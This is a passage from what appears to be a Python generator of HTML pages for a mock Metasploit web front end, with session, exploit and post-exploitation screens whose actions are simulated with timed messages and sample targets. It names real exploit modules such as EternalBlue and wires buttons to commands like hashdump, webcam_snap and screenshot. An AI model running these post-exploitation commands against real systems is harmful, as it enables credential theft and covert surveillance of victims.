            addOutput(`Format: ${outputFormat}`, 'info');
            
            setTimeout(() => {
                addOutput('Generating shellcode...', 'info');
            }, 1000);

            setTimeout(() => {
                addOutput('Encoding payload...', 'info');
            }, 2000);

            setTimeout(() => {
                addOutput('Creating output file...', 'info');
            }, 3000);

            setTimeout(() => {
                const filename = `${outputFile}.${outputFormat}`;
                addOutput(`Payload generated: ${filename}`, 'success');
                addOutput(`File saved to: payloads/${filename}`, 'success');
                
                document.getElementById('generated-files').innerHTML = `
                    <div style="color: #00ff00;">✓ ${filename}</div>
                    <div style="font-size: 0.9em; color: #0088ff;">Location: payloads/${filename}</div>
                `;
            }, 4000);

            updateListenerCommand();
        }

        function startListener() {
            const output = document.getElementById('output-terminal');
            const command = document.getElementById('listener-command').textContent;
            
            output.innerHTML = '';
            addOutput('Starting Metasploit listener...', 'info');
            addOutput('Executing commands:', 'info');
            
            command.split('\n').forEach(line => {
                addOutput(`msf6 > ${line}`, 'info');
            });

            setTimeout(() => {
                addOutput('[*] Started reverse TCP handler...', 'success');
                addOutput(`[*] Listening on ${document.getElementById('lhost').value}:${document.getElementById('lport').value}`, 'success');
                addOutput('[*] Waiting for connections...', 'info');
            }, 2000);
        }

        function addOutput(text, type = 'info') {
            const output = document.getElementById('output-terminal');
            const line = document.createElement('div');
            line.style.color = type === 'error' ? '#ff0000' : 
                             type === 'success' ? '#00ff00' : '#0088ff';
            line.textContent = text;
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
        }

        // Atualizar comando do listener quando os valores mudarem
        document.getElementById('payload-type').addEventListener('change', updateListenerCommand);
        document.getElementById('lhost').addEventListener('input', updateListenerCommand);
        document.getElementById('lport').addEventListener('input', updateListenerCommand);

        // Inicializar
        document.addEventListener('DOMContentLoaded', function() {
            updateListenerCommand();
        });
    </script>
</body>
</html>
"""

    def generate_sessions_html(self):
        """Gerenciador de sessões"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Session Manager - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .sessions-interface {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        .sessions-panel, .console-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .sessions-list {
            max-height: 500px;
            overflow-y: auto;
        }

        .session-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .session-item:hover {
            border-color: var(--hacker-blue);
        }

        .session-item.active {
            border-color: var(--hacker-green);
            background: #001100;
        }

        .session-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .session-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 15px;
            font-size: 0.9em;
        }

        .session-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .btn {
            background: transparent;
            border: 1px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 0.8em;
        }

        .btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .btn-danger {
            border-color: #ff0000;
            color: #ff0000;
        }

        .btn-danger:hover {
            background: #ff0000;
            color: var(--dark-bg);
        }

        .btn-success {
            border-color: var(--hacker-green);
            color: var(--hacker-green);
        }

        .btn-success:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .console-output {
            background: #001100;
            border: 1px solid var(--hacker-green);
            border-radius: 5px;
            padding: 15px;
            height: 400px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            color: var(--hacker-green);
            margin-bottom: 15px;
        }

        .console-input {
            display: flex;
            gap: 10px;
        }

        .console-input input {
            flex: 1;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }

        .status-active {
            background: var(--hacker-green);
            box-shadow: 0 0 10px var(--hacker-green);
        }

        .status-inactive {
            background: #ff0000;
            box-shadow: 0 0 10px #ff0000;
        }

        .quick-actions {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 10px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">SESSION MANAGER</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/payloads" class="nav-btn">Payloads</a>
                <a href="/settings" class="nav-btn">Settings</a>
            </nav>
        </header>

        <div class="sessions-interface">
            <div class="sessions-panel">
                <div class="panel-header">
                    <h3>💻 Active Sessions</h3>
                    <button class="btn" onclick="refreshSessions()">Refresh</button>
                </div>

                <div class="sessions-list" id="sessions-list">
                    <!-- Sessions will be loaded here -->
                </div>

                <div class="quick-actions">
                    <button class="btn" onclick="killAllSessions()">Kill All Sessions</button>
                    <button class="btn" onclick="upgradeShells()">Upgrade Shells</button>
                    <button class="btn" onclick="migrateProcess()">Migrate Process</button>
                </div>
            </div>

            <div class="console-panel">
                <div class="panel-header">
                    <h3>💬 Session Console</h3>
                    <div>
                        <span id="current-session">No session selected</span>
                    </div>
                </div>

                <div class="console-output" id="console-output">
                    <div>Select a session to start interacting...</div>
                </div>

                <div class="console-input">
                    <input type="text" id="session-command" placeholder="Enter command for selected session..." disabled>
                    <button class="btn" id="send-command" onclick="sendSessionCommand()" disabled>Send</button>
                </div>

                <div class="quick-actions" style="margin-top: 15px;">
                    <button class="btn" onclick="sendCommonCommand('sysinfo')">Sysinfo</button>
                    <button class="btn" onclick="sendCommonCommand('getuid')">GetUID</button>
                    <button class="btn" onclick="sendCommonCommand('ps')">Process List</button>
                    <button class="btn" onclick="sendCommonCommand('screenshot')">Screenshot</button>
                    <button class="btn" onclick="sendCommonCommand('webcam_snap')">Webcam Snap</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentSession = null;
        const sampleSessions = [
            {
                id: 1,
                type: 'meterpreter',
                host: '192.168.1.100',
                user: 'admin',
                platform: 'windows',
                arch: 'x64',
                info: 'Windows 10 Pro (Build 19043)',
                last_seen: '2 minutes ago',
                active: true
            },
            {
                id: 2,
                type: 'shell',
                host: '192.168.1.101',
                user: 'root',
                platform: 'linux',
                arch: 'x86',
                info: 'Ubuntu 20.04 LTS',
                last_seen: '5 minutes ago',
                active: true
            },
            {
                id: 3,
                type: 'meterpreter',
                host: '192.168.1.102',
                user: 'user',
                platform: 'android',
                arch: 'arm',
                info: 'Android 11 (Samsung Galaxy)',
                last_seen: '1 minute ago',
                active: true
            }
        ];

        function loadSessions() {
            const sessionsList = document.getElementById('sessions-list');
            sessionsList.innerHTML = '';

            sampleSessions.forEach(session => {
                const sessionItem = document.createElement('div');
                sessionItem.className = `session-item ${currentSession === session.id ? 'active' : ''}`;
                sessionItem.innerHTML = `
                    <div class="session-header">
                        <div>
                            <span class="status-indicator ${session.active ? 'status-active' : 'status-inactive'}"></span>
                            <strong>Session ${session.id}</strong> - ${session.type}
                        </div>
                        <div style="font-size: 0.8em; color: #888;">
                            ${session.last_seen}
                        </div>
                    </div>
                    <div class="session-info">
                        <div><strong>Host:</strong> ${session.host}</div>
                        <div><strong>User:</strong> ${session.user}</div>
                        <div><strong>Platform:</strong> ${session.platform}</div>
                        <div><strong>Arch:</strong> ${session.arch}</div>
                        <div><strong>Info:</strong> ${session.info}</div>
                    </div>
                    <div class="session-actions">
                        <button class="btn ${currentSession === session.id ? 'btn-success' : ''}" 
                                onclick="selectSession(${session.id})">
                            ${currentSession === session.id ? '✓ Selected' : 'Select'}
                        </button>
                        <button class="btn" onclick="interactSession(${session.id})">Interact</button>
                        <button class="btn" onclick="screenshotSession(${session.id})">Screenshot</button>
                        <button class="btn" onclick="upgradeSession(${session.id})">Upgrade</button>
                        <button class="btn btn-danger" onclick="killSession(${session.id})">Kill</button>
                    </div>
                `;
                sessionsList.appendChild(sessionItem);
            });
        }

        function selectSession(sessionId) {
            currentSession = sessionId;
            document.getElementById('current-session').textContent = `Session ${sessionId} selected`;
            document.getElementById('session-command').disabled = false;
            document.getElementById('send-command').disabled = false;
            
            const consoleOutput = document.getElementById('console-output');
            consoleOutput.innerHTML = `<div>Connected to Session ${sessionId}</div>`;
            
            loadSessions();
        }

        function sendSessionCommand() {
            if (!currentSession) {
                alert('Please select a session first');
                return;
            }

            const commandInput = document.getElementById('session-command');
            const command = commandInput.value.trim();
            
            if (!command) return;

            const consoleOutput = document.getElementById('console-output');
            
            // Adicionar comando ao console
            const commandLine = document.createElement('div');
            commandLine.innerHTML = `<span style="color: var(--hacker-blue);">session ${currentSession} ></span> ${command}`;
            consoleOutput.appendChild(commandLine);

            // Simular resposta
            setTimeout(() => {
                const response = document.createElement('div');
                response.style.color = 'var(--hacker-green)';
                response.textContent = `Command executed in session ${currentSession}: ${command}`;
                consoleOutput.appendChild(response);
                consoleOutput.scrollTop = consoleOutput.scrollHeight;
            }, 500);

            commandInput.value = '';
        }

        function sendCommonCommand(command) {
            if (!currentSession) {
                alert('Please select a session first');
                return;
            }

            document.getElementById('session-command').value = command;
            sendSessionCommand();
        }

        function interactSession(sessionId) {
            selectSession(sessionId);
            const consoleOutput = document.getElementById('console-output');
            consoleOutput.innerHTML += `<div>Starting interaction with session ${sessionId}...</div>`;
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }

        function screenshotSession(sessionId) {
            const consoleOutput = document.getElementById('console-output');
            consoleOutput.innerHTML += `<div>Taking screenshot from session ${sessionId}...</div>`;
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
            
            setTimeout(() => {
                consoleOutput.innerHTML += `<div style="color: var(--hacker-green);">Screenshot saved: screenshot_${sessionId}_${Date.now()}.jpg</div>`;
                consoleOutput.scrollTop = consoleOutput.scrollHeight;
            }, 1000);
        }

        function upgradeSession(sessionId) {
            const consoleOutput = document.getElementById('console-output');
            consoleOutput.innerHTML += `<div>Upgrading session ${sessionId} to meterpreter...</div>`;
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
            
            setTimeout(() => {
                consoleOutput.innerHTML += `<div style="color: var(--hacker-green);">Session ${sessionId} upgraded successfully</div>`;
                consoleOutput.scrollTop = consoleOutput.scrollHeight;
            }, 2000);
        }

        function killSession(sessionId) {
            if (confirm(`Are you sure you want to kill session ${sessionId}?`)) {
                const consoleOutput = document.getElementById('console-output');
                consoleOutput.innerHTML += `<div>Killing session ${sessionId}...</div>`;
                consoleOutput.scrollTop = consoleOutput.scrollHeight;
                
                setTimeout(() => {
                    consoleOutput.innerHTML += `<div style="color: #ff0000;">Session ${sessionId} terminated</div>`;
                    consoleOutput.scrollTop = consoleOutput.scrollHeight;
                    
                    if (currentSession === sessionId) {
                        currentSession = null;
                        document.getElementById('current-session').textContent = 'No session selected';
                        document.getElementById('session-command').disabled = true;
                        document.getElementById('send-command').disabled = true;
                    }
                    
                    // Remover sessão da lista
                    const index = sampleSessions.findIndex(s => s.id === sessionId);
                    if (index !== -1) {
                        sampleSessions.splice(index, 1);
                        loadSessions();
                    }
                }, 1000);
            }
        }

        function killAllSessions() {
            if (confirm('Are you sure you want to kill ALL sessions?')) {
                sampleSessions.length = 0;
                currentSession = null;
                document.getElementById('current-session').textContent = 'No session selected';
                document.getElementById('session-command').disabled = true;
                document.getElementById('send-command').disabled = true;
                
                const consoleOutput = document.getElementById('console-output');
                consoleOutput.innerHTML = `<div style="color: #ff0000;">All sessions terminated</div>`;
                
                loadSessions();
            }
        }

        function upgradeShells() {
            const consoleOutput = document.getElementById('console-output');
            consoleOutput.innerHTML += `<div>Upgrading all shell sessions to meterpreter...</div>`;
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }

        function migrateProcess() {
            if (!currentSession) {
                alert('Please select a session first');
                return;
            }
            
            const consoleOutput = document.getElementById('console-output');
            consoleOutput.innerHTML += `<div>Migrating session ${currentSession} to another process...</div>`;
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }

        function refreshSessions() {
            const consoleOutput = document.getElementById('console-output');
            consoleOutput.innerHTML += `<div>Refreshing sessions list...</div>`;
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
            loadSessions();
        }

        // Inicializar
        document.addEventListener('DOMContentLoaded', function() {
            loadSessions();
            
            // Permitir Enter para enviar comandos
            document.getElementById('session-command').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    sendSessionCommand();
                }
            });
        });
    </script>
</body>
</html>
"""

    def generate_exploits_html(self):
        """Gerenciador de exploits"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploits - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .exploits-interface {
            display: grid;
            grid-template-columns: 300px 1fr;
            gap: 30px;
        }

        .exploits-panel, .config-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .search-box {
            margin-bottom: 20px;
        }

        .search-box input {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .exploits-list {
            max-height: 500px;
            overflow-y: auto;
        }

        .exploit-item {
            background: var(--dark-bg);
            border: 1px solid var(--hacker-purple);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .exploit-item:hover {
            border-color: var(--hacker-blue);
        }

        .exploit-item.selected {
            border-color: var(--hacker-green);
            background: #001100;
        }

        .exploit-name {
            font-weight: bold;
            margin-bottom: 5px;
            color: var(--hacker-blue);
        }

        .exploit-info {
            font-size: 0.8em;
            color: #888;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--hacker-blue);
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }

        .exploit-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .btn {
            background: transparent;
            border: 2px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .btn-run {
            border-color: var(--hacker-green);
            color: var(--hacker-green);
        }

        .btn-run:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .output-terminal {
            background: #001100;
            border: 1px solid var(--hacker-green);
            border-radius: 5px;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            color: var(--hacker-green);
            margin-top: 20px;
        }

        .rank-indicator {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 0.7em;
            margin-left: 10px;
        }

        .rank-excellent {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .rank-great {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .rank-good {
            background: var(--hacker-purple);
            color: var(--dark-bg);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">EXPLOITS MANAGER</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/payloads" class="nav-btn">Payloads</a>
                <a href="/sessions" class="nav-btn">Sessions</a>
            </nav>
        </header>

        <div class="exploits-interface">
            <div class="exploits-panel">
                <div class="panel-header">
                    <h3>📚 Exploits Library</h3>
                </div>

                <div class="search-box">
                    <input type="text" id="search-exploits" placeholder="Search exploits...">
                </div>

                <div class="exploits-list" id="exploits-list">
                    <!-- Exploits will be loaded here -->
                </div>
            </div>

            <div class="config-panel">
                <div class="panel-header">
                    <h3>⚙️ Exploit Configuration</h3>
                    <span id="selected-exploit">No exploit selected</span>
                </div>

                <div id="exploit-config">
                    <div style="text-align: center; padding: 40px; color: #666;">
                        Select an exploit from the list to configure
                    </div>
                </div>

                <div class="exploit-actions">
                    <button class="btn btn-run" onclick="runExploit()" disabled id="run-btn">Run Exploit</button>
                    <button class="btn" onclick="showInfo()">Show Info</button>
                    <button class="btn" onclick="checkTarget()">Check Target</button>
                </div>

                <div class="output-terminal" id="output-terminal">
                    <div>Exploit output will appear here...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const exploits = [
            {
                name: "Windows SMB MS17-010 EternalBlue",
                module: "exploit/windows/smb/ms17_010_eternalblue",
                description: "Windows 7/2008 R2 SMB Remote Code Execution",
                rank: "excellent",
                platform: "windows",
                author: "Shadow Brokers",
                options: {
                    RHOST: { required: true, description: "Target address" },
                    RPORT: { required: false, default: 445, description: "Target port" }
                }
            },
            {
                name: "Apache Struts2 Remote Code Execution",
                module: "exploit/multi/http/struts2_content_type_ognl",
                description: "Apache Struts2 remote code execution vulnerability",
                rank: "great",
                platform: "multi",
                author: "Metasploit Team",
                options: {
                    RHOST: { required: true, description: "Target address" },
                    RPORT: { required: false, default: 80, description: "Target port" },
                    TARGETURI: { required: false, default: "/", description: "Target URI" }
                }
            },
            {
                name: "Android ADB Debug Server",
                module: "exploit/unix/misc/adb_server",
                description: "Android ADB debug server exploit",
                rank: "good",
                platform: "android",
                author: "Metasploit Team",
                options: {
                    RHOST: { required: true, description: "Target address" },
                    RPORT: { required: false, default: 5555, description: "Target port" }
                }
            },
            {
                name: "PHP CGI Argument Injection",
                module: "exploit/multi/http/php_cgi_arg_injection",
                description: "PHP CGI argument injection RCE",
                rank: "great",
                platform: "php",
                author: "Metasploit Team",
                options: {
                    RHOST: { required: true, description: "Target address" },
                    RPORT: { required: false, default: 80, description: "Target port" },
                    TARGETURI: { required: false, default: "/", description: "Target URI" }
                }
            }
        ];

        let selectedExploit = null;

        function loadExploits() {
            const exploitsList = document.getElementById('exploits-list');
            exploitsList.innerHTML = '';

            exploits.forEach(exploit => {
                const exploitItem = document.createElement('div');
                exploitItem.className = `exploit-item ${selectedExploit === exploit ? 'selected' : ''}`;
                exploitItem.onclick = () => selectExploit(exploit);
                
                const rankClass = `rank-${exploit.rank}`;
                
                exploitItem.innerHTML = `
                    <div class="exploit-name">
                        ${exploit.name}
                        <span class="rank-indicator ${rankClass}">${exploit.rank.toUpperCase()}</span>
                    </div>
                    <div class="exploit-info">
                        ${exploit.module}<br>
                        Platform: ${exploit.platform} | Author: ${exploit.author}
                    </div>
                `;
                exploitsList.appendChild(exploitItem);
            });
        }

        function selectExploit(exploit) {
            selectedExploit = exploit;
            document.getElementById('selected-exploit').textContent = exploit.name;
            document.getElementById('run-btn').disabled = false;
            
            const configPanel = document.getElementById('exploit-config');
            configPanel.innerHTML = '';

            // Adicionar opções do exploit
            Object.entries(exploit.options).forEach(([key, option]) => {
                const formGroup = document.createElement('div');
                formGroup.className = 'form-group';
                
                formGroup.innerHTML = `
                    <label for="opt-${key}">${key}</label>
                    <input type="text" id="opt-${key}" 
                           placeholder="${option.description}" 
                           value="${option.default || ''}">
                    <small style="color: #888; font-size: 0.8em;">${option.required ? 'Required' : 'Optional'}</small>
                `;
                
                configPanel.appendChild(formGroup);
            });

            loadExploits();
        }

        function runExploit() {
            if (!selectedExploit) {
                alert('Please select an exploit first');
                return;
            }

            const output = document.getElementById('output-terminal');
            output.innerHTML = '';

            function addOutput(text, type = 'info') {
                const line = document.createElement('div');
                line.style.color = type === 'error' ? '#ff0000' : 
                                 type === 'success' ? '#00ff00' : '#0088ff';
                line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
                output.appendChild(line);
                output.scrollTop = output.scrollHeight;
            }

            addOutput(`Starting exploit: ${selectedExploit.name}`, 'info');
            addOutput(`Module: ${selectedExploit.module}`, 'info');
            
            // Simular execução do exploit
            setTimeout(() => {
                addOutput('Setting payload...', 'info');
            }, 1000);

            setTimeout(() => {
                addOutput('Setting target options...', 'info');
            }, 2000);

            setTimeout(() => {
                addOutput('Exploiting target...', 'info');
            }, 3000);

            setTimeout(() => {
                addOutput('Sending exploit payload...', 'info');
            }, 4000);

            setTimeout(() => {
                if (Math.random() > 0.3) {
                    addOutput('Exploit completed successfully!', 'success');
                    addOutput('Meterpreter session 4 opened', 'success');
                } else {
                    addOutput('Exploit failed: Target not vulnerable', 'error');
                }
            }, 5000);
        }

        function showInfo() {
            if (!selectedExploit) {
                alert('Please select an exploit first');
                return;
            }

            const output = document.getElementById('output-terminal');
            output.innerHTML = '';

            output.innerHTML = `
                <div style="margin-bottom: 15px;">
                    <strong>Exploit Information:</strong>
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Name:</strong> ${selectedExploit.name}
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Module:</strong> ${selectedExploit.module}
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Description:</strong> ${selectedExploit.description}
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Platform:</strong> ${selectedExploit.platform}
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Author:</strong> ${selectedExploit.author}
                </div>
                <div style="margin-bottom: 10px;">
                    <strong>Rank:</strong> ${selectedExploit.rank}
                </div>
            `;
        }

        function checkTarget() {
            if (!selectedExploit) {
                alert('Please select an exploit first');
                return;
            }

            const output = document.getElementById('output-terminal');
            output.innerHTML = '';

            function addOutput(text, type = 'info') {
                const line = document.createElement('div');
                line.style.color = type === 'error' ? '#ff0000' : 
                                 type === 'success' ? '#00ff00' : '#0088ff';
                line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
                output.appendChild(line);
                output.scrollTop = output.scrollHeight;
            }

            addOutput(`Checking target for: ${selectedExploit.name}`, 'info');
            
            setTimeout(() => {
                addOutput('Target appears to be vulnerable', 'success');
            }, 2000);
        }

        // Filtro de busca
        document.getElementById('search-exploits').addEventListener('input', function(e) {
            const searchTerm = e.target.value.toLowerCase();
            const exploitItems = document.querySelectorAll('.exploit-item');
            
            exploitItems.forEach(item => {
                const text = item.textContent.toLowerCase();
                item.style.display = text.includes(searchTerm) ? 'block' : 'none';
            });
        });

        // Inicializar
        document.addEventListener('DOMContentLoaded', function() {
            loadExploits();
        });
    </script>
</body>
</html>
"""

    def generate_post_exploitation_html(self):
        """Ferramentas de pós-exploração"""
        return """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Post-Exploitation - Metasploit Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --hacker-green: #00ff00;
            --hacker-blue: #0088ff;
            --hacker-purple: #9d00ff;
            --dark-bg: #0a0a0a;
            --darker-bg: #050505;
        }

        body {
            font-family: 'Courier New', monospace;
            background: var(--dark-bg);
            color: var(--hacker-green);
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 1px solid var(--hacker-green);
            margin-bottom: 30px;
        }

        .logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--hacker-blue);
        }

        nav {
            display: flex;
            gap: 15px;
        }

        .nav-btn {
            background: transparent;
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            transition: all 0.3s;
        }

        .nav-btn:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .post-exploit-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .tool-card {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
            transition: all 0.3s;
        }

        .tool-card:hover {
            border-color: var(--hacker-blue);
            transform: translateY(-5px);
        }

        .tool-icon {
            font-size: 2.5em;
            margin-bottom: 15px;
            text-align: center;
        }

        .tool-card h3 {
            color: var(--hacker-blue);
            margin-bottom: 10px;
            text-align: center;
        }

        .tool-description {
            color: #888;
            margin-bottom: 20px;
            text-align: center;
            font-size: 0.9em;
        }

        .tool-actions {
            display: flex;
            gap: 10px;
            justify-content: center;
        }

        .btn {
            background: transparent;
            border: 1px solid var(--hacker-blue);
            color: var(--hacker-blue);
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 0.8em;
        }

        .btn:hover {
            background: var(--hacker-blue);
            color: var(--dark-bg);
        }

        .btn-success {
            border-color: var(--hacker-green);
            color: var(--hacker-green);
        }

        .btn-success:hover {
            background: var(--hacker-green);
            color: var(--dark-bg);
        }

        .output-panel {
            background: var(--darker-bg);
            border: 1px solid var(--hacker-green);
            border-radius: 10px;
            padding: 25px;
            margin-top: 30px;
        }

        .panel-header {
            border-bottom: 1px solid var(--hacker-green);
            padding-bottom: 15px;
            margin-bottom: 20px;
            color: var(--hacker-blue);
        }

        .output-terminal {
            background: #001100;
            border: 1px solid var(--hacker-green);
            border-radius: 5px;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            color: var(--hacker-green);
        }

        .session-selector {
            margin-bottom: 20px;
        }

        .session-selector select {
            width: 100%;
            padding: 10px;
            background: var(--dark-bg);
            border: 1px solid var(--hacker-green);
            color: var(--hacker-green);
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">POST-EXPLOITATION</div>
            <nav>
                <a href="/" class="nav-btn">Home</a>
                <a href="/dashboard" class="nav-btn">Dashboard</a>
                <a href="/sessions" class="nav-btn">Sessions</a>
                <a href="/exploits" class="nav-btn">Exploits</a>
            </nav>
        </header>

        <div class="session-selector">
            <label>Select Target Session:</label>
            <select id="target-session">
                <option value="">Select a session...</option>
                <option value="1">Session 1 - Windows (192.168.1.100)</option>
                <option value="2">Session 2 - Linux (192.168.1.101)</option>
                <option value="3">Session 3 - Android (192.168.1.102)</option>
            </select>
        </div>

        <div class="post-exploit-grid">
            <div class="tool-card">
                <div class="tool-icon">🕵️</div>
                <h3>System Recon</h3>
                <p class="tool-description">Gather system information, network config, and user data</p>
                <div class="tool-actions">
                    <button class="btn" onclick="runCommand('sysinfo')">System Info</button>
                    <button class="btn" onclick="runCommand('ifconfig')">Network Info</button>
                    <button class="btn" onclick="runCommand('getuid')">User Info</button>
                </div>
            </div>

            <div class="tool-card">
                <div class="tool-icon">📁</div>
                <h3>File System</h3>
                <p class="tool-description">Browse, download, and manipulate files</p>
                <div class="tool-actions">
                    <button class="btn" onclick="runCommand('pwd')">Current Dir</button>
                    <button class="btn" onclick="runCommand('ls')">List Files</button>
                    <button class="btn" onclick="runCommand('search -f *.txt')">Search Files</button>
                </div>
            </div>

            <div class="tool-card">
                <div class="tool-icon">🔑</div>
                <h3>Credential Access</h3>
                <p class="tool-description">Dump passwords and hashes</p>
                <div class="tool-actions">
                    <button class="btn" onclick="runCommand('hashdump')">Dump Hashes</button>
